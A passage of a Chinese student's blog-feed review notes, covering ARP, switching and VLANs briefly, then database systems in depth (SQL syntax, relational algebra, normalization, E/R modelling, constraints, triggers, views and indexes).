<code>FF:FF:FF:FF:FF:FF</code></li><li>各局域网设备都能收到。</li></ul><p><strong>主机 B 收到 ARP 请求，发现目标 IP 是自己</strong>：</p><ul><li><p>它会回复一个 <strong>ARP 响应包</strong>，告诉主机 A：</p><p>“我 192.168.1.2 的 MAC 地址是 BB-BB-BB-BB-BB-BB”</p><p>此时，B 已经知道 A 的 MAC 地址了，不需要再额外发 ARP 请求。</p></li></ul><p><strong>主机 A 接收 ARP 响应</strong>：</p><ul><li>将 192.168.1.2 和 BB-BB-BB-BB-BB-BB 的对应关系写入 ARP 缓存表。</li><li>后续发送数据时就可以直接使用该 MAC 地址</li></ul><h2 id="交换机自学习"><a href="#交换机自学习" class="headerlink" title="交换机自学习"></a>交换机自学习</h2><p>交换表的表项至少包含一个MAC地址，连通该MAC地址的端口</p><p>初始时交换表为空</p><p>主机 A（MAC_A）发送数据给主机 B（MAC_B），交换机学习MAC_A，MAC_B不在表中，泛洪</p><p>更新MAC地址表</p><p>如果B发送数据给A，那么交换机单播转发</p><h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><p>广播域是指网络中能接收到同一个广播消息的所有设备的集合。当一个设备发送广播帧（如ARP请求）时，该帧会被广播域内的所有设备接收。</p><p>交换机的所有端口属于同意广播域，路由器可以隔离广播域，VLAN可以分割广播域。</p><p>冲突域是指网络中共享同一信道的设备集合，这些设备在发送数据时可能发生冲突（即多个设备同时发送导致数据碰撞）。冲突域的大小影响网络效率（尤其是半双工通信）。</p><p>交换机每个端口是一个独立的冲突域，路由器可以隔离冲突域</p><p>VLAN（虚拟局域网）是一种在二层（数据链路层）将物理局域网划分为多个逻辑子网的技术，使不同VLAN之间的设备无法直接通信（除非通过路由器或三层交换机）。</p><p>还有一部分内容</p><p>第七章怎么还要考啊喂☹️</p><p>IEEE 802.11 Wifi</p><p>蜂窝网络 4G</p><p>IEEE 802.3 以太网</p><p>802.11使用星形拓扑，其中心称为接入点，在MAC层使用CSMA&#x2F;CA协议，又称为Wi-Fi</p><p>隐藏终端问题和衰减使得多路访问在无线网络中的复杂性远高于在有线网络中的情况</p><p>CDMA（自学）<a href="https://blog.csdn.net/qq_43262059/article/details/106201119">https://blog.csdn.net/qq_43262059/article/details/106201119</a> 放这里</p><p>码分多址(CDMA)属于信道划分协议族，在无线LAN和蜂窝技术中应用十分广泛</p><p>看题</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619174437913.png" alt="image-20250619174437913"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619174510605.png" alt="image-20250619174510605"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619174535416.png" alt="image-20250619174535416"></p>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统</title>
      <link href="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/"/>
      <url>/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>参考<a href="https://superpung.notion.site/6c01057bb5c4474d9849b9df8e759bc1">https://superpung.notion.site/6c01057bb5c4474d9849b9df8e759bc1</a></p><p>2025.6.19</p><p>呜呜呜考的好烂😫下次一定好好复习）索引查询代价一定要看</p><h2 id="关系数据模型"><a href="#关系数据模型" class="headerlink" title="关系数据模型"></a>关系数据模型</h2><p>数据库是长期存储在计算机内，有组织的，可共享的数据的集合</p><p>DBMS是用户与操作系统之间的一层数据管理软件</p><p>事务处理的ACID性质：原子性，一致性，独立性，持久性</p><p>sql基本语法：</p><p>创建数据库：CREATE DATABASE 数据库名；</p><p>删除数据库：DROP DATABASE 数据库名；</p><p>一个数据模型包括结构，操作，约束三部分</p><p>Schema:关系(属性) ex:Movies(title,year,genre)</p><p>Tuple:关系的一行，包括每个属性 ex: (star,1979,comedy)</p><p>Domain: 与关系的每个属性相关 ex: Movies(title:string,year:integer,genre:string)</p><p>关系的键Key</p><p>表声明：</p><p>CREATE TABLE movieexec (<br>    name CHAR(30),<br>    address VARCHAR(255),<br>    cert INT PRIMARY KEY, &#x2F;&#x2F; 主键<br>    networth INT,<br>    FOREIGN KEY (attributeName) REFERENCES tableName(attributeName) &#x2F;&#x2F; 外键，参照完整性<br>    PRIMARY KEY (), &#x2F;&#x2F; 实体完整性<br>);</p><p>sql数据类型：</p><p>CHAR(n) 长度为n的定长字符串</p><p>VARCHAR(n) 最大长度为n的变长字符串</p><p>INT 长整数</p><p>REAL 浮点数</p><p>BIT(n) 固定长度位串</p><p>BIT VARYING(n) 可变长度位串</p><p>DECIMAL(n,d)</p><p>DATE</p><p>TIME</p><p>实体完整性要求关系表的<strong>主键（Primary Key）不能为空值（NULL）</strong>，而且<strong>每一行的主键值必须唯一</strong>。</p><p><strong>定义</strong>：参照完整性约束用于维护<strong>外键（Foreign Key）与主键之间的依赖关系</strong>，要求外键的值要么为 NULL，要么必须对应主键表中的某个已有值。</p><p>插入数据：INSERT INTO 表名 VALUES ( );</p><p>查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span>目标列（属性）表达式<span class="operator">&gt;</span>[, <span class="operator">&lt;</span>目标列表达式<span class="operator">&gt;</span>...]</span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>表（关系）名或视图名<span class="operator">&gt;</span>[, <span class="operator">&lt;</span>表名或视图名<span class="operator">&gt;</span>...]</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>条件表达式<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>列名<span class="number">1</span><span class="operator">&gt;</span> [<span class="keyword">HAVING</span> <span class="operator">&lt;&gt;</span>]]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>列名<span class="number">2</span><span class="operator">&gt;</span> [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>]];</span><br></pre></td></tr></table></figure><p>order by排序 ORDER BY 列名 [ASC|DESC];</p><p>group by对查询结果进行分组，<code>HAVING</code> 是对<strong>分组之后的结果</strong>筛选，在 SQL 中使用 <code>GROUP BY</code> 时，<strong>SELECT 子句中除聚合函数外的字段，必须全部出现在 <code>GROUP BY</code> 后面</strong>，这是为了保证分组后的查询结果是<strong>逻辑一致且可计算的</strong>。</p><p>修改关系模式</p><p>DROP TABLE R;</p><ul><li><code>ALTER TABLE tableName ADD attributeName TYPE(n);</code>（添加属性）</li><li><code>ALTER TABLE tableName DROP attributeName;</code>（删除属性）</li><li><code>ALTER TABLE tableName ADD attributeName TYPE(n) DEFAULT ‘defaultValue’;</code>（添加有默认值的属性）</li></ul><p>default values 默认值</p><p>&#96;ALTER TABLE tableName ADD attributeName TYPE(n) DEFAULT ‘haha’;</p><h2 id="关系数据库语言"><a href="#关系数据库语言" class="headerlink" title="关系数据库语言"></a>关系数据库语言</h2><h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><p>Set operations : Union,Intersection, Difference</p><p>SELECT * FROM R UNION SELECT * FROM S;</p><p>SELECT * FROM R INTERSECT SELECT * FROM S;</p><p>SELECT * FROM R EXCEPT SELECT * FROM S;</p><p>Projection 投影 选择关系中的几个属性</p><p>SELECT [DISTINCT] genre FROM movies;</p><p>Selection选择 选择符合条件的关系</p><p>SELECT * from movies where length&gt;100;</p><p>Cartesian Product笛卡尔积 RxS</p><p>SELECT * FROM R CROSS JOIN S;或SELECT * FROM R,S;</p><p>Natural join自然连接R\Join S  等价于从二者的笛卡尔积中选择出属性值相同的元组，再投影出属性集相并后的关系</p><p>SELECT * FROM U NATURAL INNER JOIN V;</p><p>Theta-join theta连接 等价于从二者的笛卡尔积中选择出一定条件的元组</p><p>SELECT * FROM U INNER JOIN V ON a&gt;d;</p><p>重命名 rename \rho 将R的属性重命名为S的</p><p>Division 除法 找出所有在 R 中，<strong>对 S 中所有 B 都有关联</strong>的 A。</p><p>仅有的冗余：</p><ul><li>交 &#x3D; 差差</li><li>Theta 连接 &#x3D; 笛卡尔积的选择</li><li>自然连接 &#x3D; Theta 连接的投影</li></ul><p>LIKE模糊匹配字符串，%匹配<strong>任意长度</strong>的任意字符（包括 0 个），_匹配任意一个字符</p><p>NULL的规定：</p><ul><li>任何数与NULL运算结果都是NULL</li><li>任何数与NULL比较结果都是UNKNOWN</li><li>IS NULL操作</li></ul><p>TRUE表示1，FALSE表示0，UNKOWN表示1&#x2F;2</p><h3 id="Subquery子查询"><a href="#Subquery子查询" class="headerlink" title="Subquery子查询"></a>Subquery子查询</h3><p>子查询是另一个查询的一部分，子查询可以嵌套</p><p>SELECT name FROM MovieExec WHERE cert &#x3D; (SELECT * FROM Movies WHERE title &#x3D; ‘Star Wars’)；</p><p>SQL operators</p><p>s IN R</p><p>s &gt; ALL R</p><p>s&lt; ANY R</p><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250603171506054.png" alt="image-20250603171506054"></p><p>聚合函数 COUNT，SUM，AVG,MAX,MIN</p><h3 id="Modification"><a href="#Modification" class="headerlink" title="Modification"></a>Modification</h3><p>INSERT INTO R(A1, …, An) VALUES (v1, …, vn);</p><p>DELETE FROM R WHERE 条件;</p><p>UPDATE R SET 新值 WHERE 条件</p><h2 id="关系数据库设计理论"><a href="#关系数据库设计理论" class="headerlink" title="关系数据库设计理论"></a>关系数据库设计理论</h2><h3 id="函数依赖FD"><a href="#函数依赖FD" class="headerlink" title="函数依赖FD"></a>函数依赖FD</h3><p>用于描述表中属性（列）之间的<strong>逻辑关系</strong>，对理解<strong>范式（如第三范式）和规范化</strong>非常重要。</p><p>在关系 R 中，若对于任意两个元组（行） t1 和 t2：<br>如果 t1[A] &#x3D; t2[A]，那么必有 t1[B] &#x3D; t2[B]，<br>就说 <strong>属性集 A 函数决定属性集 B</strong>，记作A-&gt;B</p><p>R 满足函数依赖 F：</p><ul><li>确定关系 R 的每个实例都能使一个给定的 FD F 为真</li><li>作用：在 R 上声明了一个约束，而不是仅针对 R 的一个实例</li></ul><p>关系的键：一组属性决定了该关系的其他所有属性，键是最小集合</p><p>有时一个关系可能会有多个键，通常需要指定其中一个为主键primary key</p><p>超键Superkey：一个包含键的属性的集合</p><p>等价 Equivalent：如果满足 FD S 的关系实例的集合和满足 FD T 的关系实例的集合相同，则 S 和 T 等价</p><p>推断 Follows：如果满足 FD T 的所有关系实例也满足 FD S，则 T 可以推断出 S（S follows from T）</p><p>规则：</p><ul><li>分解规则 Splitting rule：A1A2…An → B1B2…Bm 等价于 A1A2…An → Bi，i &#x3D; 1,2,…,m</li><li>组合规则 Combining rule：A1A2…An → Bi，i &#x3D; 1,2,…,m 等价于 A1A2…An → B1B2…Bm</li><li>注意：左侧不能分解</li></ul><p>平凡函数依赖：关系上的一个约束对所有关系实例都成立，且与其他约束无关，则这个约束就是平凡的，一个属性集可以函数决定它的子集</p><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250603174828539.png" alt="image-20250603174828539"></p><p><strong>候选键</strong>是指：能唯一标识元组（记录），并且<strong>没有冗余</strong>的属性集合，能推出其他所有属性</p><p>计算属性的闭包</p><p>X+&#x3D;在依赖集 F 中，所有能由 X 推导出的属性集合</p><p>计算方法：</p><ol><li>初始化：令 X+:&#x3D;XX^+ :&#x3D; XX+:&#x3D;X</li><li>重复以下步骤直到不再变化：对于依赖 Y→Z∈FY \to Z \in FY→Z∈F，如果 Y⊆X+Y \subseteq X^+Y⊆X+，则将 ZZZ 加入 X+X^+X+</li></ol><p>传递规则：属性集 A 函数决定属性集 B，属性集 B 函数决定属性集 C，则属性集 A 函数决定属性集 C</p><p>最小基本集：它是函数依赖集的一个<strong>等价表示</strong>，但去除了冗余，更便于分析候选键、范式分解等</p><ol><li>最小基本集中所有 FD 右侧只有一个属性</li><li>从最小基本集中删除任何一个 FD，它不再是基本集</li><li>删除其中一个 FD 左侧的一个或多个属性，它不再是基本集</li></ol><p>ArmStrong公理：用于推导出所有隐含的函数依赖</p><p>1.自反性：如果 Y⊆X，则 X→Y</p><p>2.增广性：如果 X→Y，则 XZ→YZ</p><p>3.传递性：如果 X→Y,Y→Z，则 X→Z</p><p>函数依赖集的投影：在一个关系 R 上存在一个函数依赖集 F，如果我们从 R 投影出一个子关系 S（属性子集），那么我们要找出在这个 S 上<strong>仍然成立</strong>的那些函数依赖</p><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250603195129643.png" alt="image-20250603195129643"></p><h3 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h3><p>为了解决数据库设计不规范造成的冗余，更新异常，删除异常</p><p>分解关系：</p><p>分解 Decomposition：给定关系 R(A1,A2,…,An)，分解为 S(B1,B2,…Bm) 和 T(C1,C2,…,Ck) 满足：</p><ol><li>{A1,A2,…An} &#x3D; {B1,B2,…,Bm} $\cup$ {C1,C2,…,Ck}</li><li>$S &#x3D; \pi_{B_1,B_2,…,B_m}(R)$</li><li>$T &#x3D; \pi_{C_1,C_2,…,C_k}(R)$</li></ol><p>BC 范式 Boyce-Codd Normal Form，BCNF：每个非平凡FD的左侧必须是R的超键或者没有非平凡FD</p><p>任意一个二元关系都属于 BCNF</p><p>如何把关系分解为BCNF:</p><p>找到违反 BCNF 的依赖 <code>X → A</code>（X 不是候选键）</p><p>分解原关系 R 为两个关系：</p><ul><li>一个关系：<code>X ∪ A</code></li><li>另一个关系：<code>R - A</code>（但保留 X）</li></ul><p>重复以上过程，直到所有子关系都满足 BCNF</p><p>一道例题：<a href="https://blog.csdn.net/weixin_69884785/article/details/131377341">https://blog.csdn.net/weixin_69884785/article/details/131377341</a></p><p>好的分解：</p><ul><li>消除异常</li><li>可恢复信息</li><li>保持依赖</li></ul><p>Lossless join无损连接</p><p>依照上述 BCNF 分解算法分解关系，则可以通过自然连接得到初始关系：</p><ul><li>属性集 X、Y、Z</li><li>如果 R 有 FD Y → Z，且 R 的属性集为 $X\cup Y\cup Z$</li><li>则 $R &#x3D; \pi_{X\cup Y}(R)\Join\pi_{Y\cup Z}(R)$</li></ul><p>无损连接的chase检验</p><p>假设关系 R 的属性为 {A, B, C, …}，分解成子关系 R₁, R₂, …，我们用一个表格模拟元组，跟踪属性值的变换</p><p><a href="https://blog.csdn.net/weixin_56462041/article/details/130225013">https://blog.csdn.net/weixin_56462041/article/details/130225013</a></p><p>dependancy preservation保持依赖</p><p> BCNF 分解后的关系，无法同时具有无损连接和依赖保持的性质</p><p>第三范式：</p><ul><li>对于每个非平凡 FD A1A2…An → B1B2…Bm，要么属性集 A 是超键，要么 B - A 是主属性</li><li>对于每个非平凡 FD，或者其左侧是超键，或者其右侧仅由主属性构成，主属性是键的成员，无传递依赖</li></ul><p>3NF分解步骤</p><p>第一步：为每个函数依赖创建关系模式</p><ol><li>R₁(A,B,C,D) —— 由AB→CD</li><li>R₂(A,E) —— 由A→E</li><li>R₃(B,F,H) —— 由B→FH</li><li>R₄(C,G) —— 由C→G</li><li>R₅(D,B) —— 由D→B</li><li>R₆(G,C) —— 由G→C</li><li>R₇(H,I) —— 由H→I<br>第二步：合并相同左部的关系</li></ol><p>合并R₄和R₆（都基于C和G）：</p><ul><li>R₄’(C,G) —— 合并C→G和G→C</li></ul><p>第三步：检查候选键是否被包含</p><p>候选键是AB，已包含在R₁中</p><p>第四步：最终3NF分解</p><ol><li>R₁(A,B,C,D) —— {AB→CD}</li><li>R₂(A,E) —— {A→E}</li><li>R₃(B,F,H) —— {B→F, B→H}</li><li>R₄’(C,G) —— {C→G, G→C}</li><li>R₅(D,B) —— {D→B}</li><li>R₇(H,I) —— {H→I}</li></ol><p>验证无损连接性</p><p>使用Chase算法验证：</p><ul><li><p>初始表：</p><p>Copy</p><p>Download</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">R₁: A B C D a e1 f1 g1 h1 i1</span><br><span class="line">R₂: A a B1 C1 D1 E a f1 g1 h1 i1</span><br><span class="line">R₃: A1 B a C1 D1 E1 F a H a I1</span><br><span class="line">R₄&#x27;: A1 B1 C a D1 E1 F1 G a H1 I1</span><br><span class="line">R₅: A1 B a C1 D a E1 F1 G1 H1 I1</span><br><span class="line">R₇: A1 B1 C1 D1 E1 F1 G1 H a I a</span><br></pre></td></tr></table></figure></li><li><p>通过应用函数依赖可以推导出所有属性都有”a”，证明分解是无损的</p></li></ul><p> 验证依赖保持性</p><p>检查原始F中的每个依赖：</p><ol><li>AB→CD：由R₁保持</li><li>A→E：由R₂保持</li><li>B→FH：由R₃保持</li><li>C→G：由R₄’保持</li><li>D→B：由R₅保持</li><li>G→C：由R₄’保持</li><li>H→I：由R₇保持</li></ol><p>所有依赖都被保持</p><p>最终3NF分解结果</p><p>ρ &#x3D; {<br>R₁(A,B,C,D),<br>R₂(A,E),<br>R₃(B,F,H),<br>R₄’(C,G),<br>R₅(D,B),<br>R₇(H,I)<br>}</p><p>第一范式 First Normal Form，1NF：每个属性的值是原子值、有键。</p><p>第二范式 Second Normal Form，2NF：所有非主属性都被主键函数决定，不能被主键的一部分决定。</p><h3 id="多值依赖MVD"><a href="#多值依赖MVD" class="headerlink" title="多值依赖MVD"></a>多值依赖MVD</h3><ul><li>两个属性或属性集合相互独立的断言</li><li>广义的函数依赖</li></ul><p>在固定 X 的值时，Y 的所有可能取值集合，与 R 中其他属性无关,则X-&gt;-&gt;Y</p><p>定义：</p><ul><li>MVD A1A2…An →→ B1B2…Bm 指 B 的值与 R 中不在 A 和 B 中的属性是独立的</li><li>对于 R 中每个在所有 A 属性上一致的元组对 t 和 u，能在 R 中找到满足下列条件的元组 v：<ol><li>在 A 属性上的取值与 t 和 u 相同</li><li>在 B 属性上的取值与 t 相同</li><li>在 R 中不属于 A 和 B 的所有其他属性上的取值与 u 子相同</li></ol></li><li>(x, y, z)：x →→ y、x →→ z，r 中存在 (a, b, c) 和 (a, d, e)，则 r 中也存在 (a, b, e) 和 (a, d, c)</li></ul><p>平凡MVD:A1A2…An →→ B1B2…Bm（{B_1,B_2,…,B_m}\subseteq{A_1,A_2,…,A_m}</p><p>MVD满足传递规则，但不满足分解规则和组合规则</p><p>每个FD都是MVD</p><p>互补规则：如果 A1A2…An →→ B1B2…Bm 是关系 R 中的 MVD，则 R 也满足 A1A2…An →→ C1C2…Ck（C 是 R 中除 A 和 B 外的属性集）</p><p>4NF范式：对于每个非平凡 MVD A1A2…An →→ B1B2…Bm，{A1, A2, …, An} 都是超键</p><p>4NF分解算法：</p><p>1.初始化\rho&#x3D;{R}</p><p>2.如果\rho的所有模式Ri都满足4NF,转4</p><p>3.如果\rho中有一个关系模式S不是4NF,则S中一定有一个多值依赖X-&gt;-&gt;Y且X不包含S的超键，S-Y-X不等于空集，XY不等于S,令Z&#x3D;S-X-Y,设S1&#x3D;XZ,S2&#x3D;S-Z,用分解{S1，S2}代替S,由于S1交S2&#x3D;X,S1-S2&#x3D;Z,所以有(S1交S2)-&gt;-&gt;(S1-S2),分解具有无损连接性，接2</p><p>4.分解结束</p><h2 id="ER模型"><a href="#ER模型" class="headerlink" title="ER模型"></a>ER模型</h2><p>entity-relationship model</p><p>数据库设计阶段：思考 → 高级设计 → 关系数据库模式 → 关系 DBMS</p><h3 id="E-R图"><a href="#E-R图" class="headerlink" title="E&#x2F;R图"></a>E&#x2F;R图</h3><p>Entity Sets 实体集：实体 entity 是某种抽象对象，相似实体的集合形成实体集,E&#x2F;R 图中用矩形表示</p><p>Attributes属性：实体集中实体具有的属性，E&#x2F;R图中用椭圆表示，主键加下划线</p><p>Relationship联系：多个实体集的连接，E&#x2F;R图中用菱形表示</p><p>联系的度：联系实体集的数量</p><p>二元E&#x2F;R联系的多样性：</p><ul><li>一对一：R 既是 E 到 F 的多对一联系，又是 F 到 E 的多对一联系</li><li>一对多：F 到 E 是多对一联系，则 E 到 F 是一对多联系</li><li>多对一：E 中任一实体与 F 中至多一个实体联系</li><li>多对多：R 既不是 E 到 F 的多对一联系，又不是 F 到 E 的多对一联系</li></ul><p>设计原则：忠实性，避免冗余，简单性</p><p>E&#x2F;R模型的约束</p><p>键：每个实体集都必须有一个键，通常选择其中一个键为主键，用下划线标识</p><p>参照完整性：箭头表示从E到F的多对一关系，F中的实体必须存在</p><p>度约束：边上加数字，约束实体联系的数量</p><p>弱实体集：一个实体集键由另一个实体集的部分或全部属性构成，一些实体不能独立存在，弱实体集是指依赖于其他实体集的实体集合。它们没有自己的唯一标识符，只能通过与其相关联的其他实体集来进行识别和区分</p><p>弱实体集表示法：双边框的矩形，其多对一的关系显示为双边框的菱形</p><h2 id="约束与触发器"><a href="#约束与触发器" class="headerlink" title="约束与触发器"></a>约束与触发器</h2><h3 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h3><p>约束：数据库强制施加在表字段（列）上的<strong>规则</strong>，用来限制插入、更新或删除的数据必须符合某种要求</p><p>主键约束（PRIMARY KEY):主键 &#x3D; NOT NULL + UNIQUE，唯一标识一行</p><p>外键约束（FOREIGN KEY):外键，引用另一个表的主键，保持参照完整性,被参照的属性必须是主键或 Unique</p><p>对于被引用表的值的修改，引用表有三种处理方式：</p><p>默认：拒绝修改</p><p>casecade：引用表作同样修改</p><p>Set NULL:把引用表的值改为NULL</p><p>唯一约束（UNIQUE):所有值必须唯一</p><p>非空约束（NOT NULL):不允许为NULL,外键更新的方案 1 不可行、Set NULL 策略不可行</p><p>声明外键时可以指定策略：属性后跟 ON [UPDATE, DELETE] [SET NULL, CASCADE]</p><p>CHECK:自定义条件约束</p><p>DEFAULT:指定默认值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Student (</span><br><span class="line">    student_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    age <span class="type">INT</span> <span class="keyword">CHECK</span> (age <span class="operator">&gt;</span> <span class="number">0</span>),</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line">    class_id <span class="type">INT</span>,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (class_id) <span class="keyword">REFERENCES</span> Class(class_id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>循环约束条件</p><p>延迟约束检查：在参照的属性中插入或更新值，这个值不在被参照的属性中，有三种解决方案：</p><ul><li>先插入其他属性值，参照属性值置空，再在被参照的关系中插入新的元组包含值，最后更新参照的属性值（问题是参照的属性不能被其他属性参照，而且不能有非空约束）</li><li>先在被参照的关系中插入，再在参照的关系中插入（问题是两个关系不能存在循环约束）<ul><li>循环约束 circular constraints：不能通过改变顺序解决，不能插入新值</li></ul></li><li>延迟检查：将两个插入组成事务，告知 DBMS 直到整个事务完成要提交时再检查约束</li></ul><p>延迟检查声明：外键后跟<code>DEFERRABLE INITIALLY DEFERRED</code>在每个事务提交之前检查</p><p><code>DEFERRABLE INITIALLY IMMEDIATE</code>每条语句之后检查，与not deferrable相同，但是可以修改延迟状态</p><p>SET CONSTRAINTS myconstraint DEFERRED;</p><p>  NOT DEFERRABLE（默认）数据库修改语句执行，立即检查约束</p><p>基于属性的check约束：属性后面跟check条件，presc INT, CHECK (presc IN (SELECT cert FROM movieExec))</p><p>基于元组的check约束：触发条件更强、更频繁，对元组的任意属性的修改都会触发</p><ul><li>如果约束涉及元组的多个属性，则必须是基于元组的约束</li><li>如果约束仅涉及元组的一个属性，则二者都可</li></ul><p>修改约束：</p><p>给约束命名：</p><ul><li><code>CONSTRAINT 约束名 约束</code></li></ul><p>修改约束：</p><ul><li><code>SET CONSTRAINT 约束名 DEFERRED 或 IMMEDIATE</code></li><li><code>ALTER TABLE 关系名 DROP CONSTRAINT 约束名</code></li><li><code>ALTER TABLE 关系名 ADD CONSTRAINT 约束名</code></li></ul><p>断言：数据库模式的元组，像关系和视图一样</p><p>CREATE ASSERTION 断言名 CHECK 条件，条件可以引用数据库模式的任何关系或属性，断言是一个布尔值的 SQL 表达式，必须一直为真</p><p>删除：DROP ASSERTION 断言名</p><h3 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h3><p>只有特定事件发生时才被激活</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER 触发器名</span><br><span class="line">[BEFORE|AFTER] [INSERT|UPDATE|DELETE] OF tablename ON attribute</span><br><span class="line">REFERENCTING</span><br><span class="line">OLD ROW AS oldname,NEW ROW AS newname</span><br><span class="line">FOR EACH ROW（只对每个修改的行执行一次）</span><br><span class="line">WHEN 条件</span><br><span class="line">操作</span><br></pre></td></tr></table></figure><ul><li>行级触发器 row-level：一次只对一个元组</li><li>语句级触发器 statement-level：一次针对 SQL 语句中被改变的所有元组</li></ul><h2 id="视图和索引"><a href="#视图和索引" class="headerlink" title="视图和索引"></a>视图和索引</h2><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><p>在表或其他视图上的查询所定义的一种关系，分为虚拟视图和物化视图（materialized ）</p><p>声明：CREATE [MATERIALIZED] VIEW 视图名 AS 查询，默认为虚拟视图</p><p>可以像查询基本表一样查询视图。</p><p>有些时候可以对视图进行插入删除更新操作</p><p>删除：DROP VIEW 视图名</p><p>DROP TABLE 表名（视图不可用）</p><p>可更新视图</p><p>前提：</p><ul><li>从一个基本表 R 中 SELECT 一些属性</li><li>WHERE 子句在子查询中不能使用关系 R</li><li>FROM 子句只能包含 R，不能有其他关系</li><li>SELECT 足够多的属性</li></ul><p>更新视图的影响：</p><ul><li>视图中插入：在基本表中插入，视图中没有的属性用 NULL</li><li>视图中删除：从基本表中删除，须同时满足视图中删除的条件和定义视图的条件</li><li>视图中更新：在基本表中更新，须同时满足视图中更新的条件和定义视图的条件</li></ul><p>视图中的触发器：在视图上定义触发器，用 INSTEAD OF，将那些对视图进行更改的操作，替换为在基本表上的合适的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER para</span><br><span class="line">INSTEAD OF INSERT ON Movies</span><br><span class="line">REFERENCING</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>index：用来加速访问关系中的元组的数据结构，提高在属性 A 上查找具有某个特定值的元组的效率，可以是哈希表，但在 DBMS 中是 B-树，一种广义上的平衡二叉树</p><p>声明：CREATE INDEX 索引名 ON 关系名(属性名)，属性可以有多个，有顺序</p><p>删除：DROP INDEX 索引名</p><p>索引的选择</p><p>选择一组值创建索引，索引会使给关系的插入删除更新操作复杂耗时</p><p>最有效的索引是键的索引</p><p>物化视图：如果某个视图频繁使用，将它实体化效率更高</p><h2 id="服务器和安全"><a href="#服务器和安全" class="headerlink" title="服务器和安全"></a>服务器和安全</h2><h3 id="三层体系结构"><a href="#三层体系结构" class="headerlink" title="三层体系结构"></a>三层体系结构</h3><p>通用的体系结构：</p><ol><li>Web 服务器：连接客户端与数据库系统</li><li>应用服务器：执行交易逻辑</li><li>数据库服务器：运行 DBMS 并且执行应用服务器请求的查询和更新</li></ol><h3 id="PSM"><a href="#PSM" class="headerlink" title="PSM"></a>PSM</h3><p>持久性存储模块 PSM &#x3D; 其他语句（if、while 等）和 SQL 的混合</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE &lt;name&gt; (</span><br><span class="line">&lt;parameter list&gt;)</span><br><span class="line">optional local declaration</span><br><span class="line">body;</span><br><span class="line">CREATE FUNCTION &lt;name&gt; (</span><br><span class="line">&lt;parameter list&gt;) RETURNS &lt;type&gt;</span><br><span class="line">optional local declaration</span><br><span class="line">body;</span><br></pre></td></tr></table></figure><p>局部声明：<code>DECLARE 变量名 类型 默认值</code></p><p>参数：模式-名称-类型三元组：</p><ul><li>模式 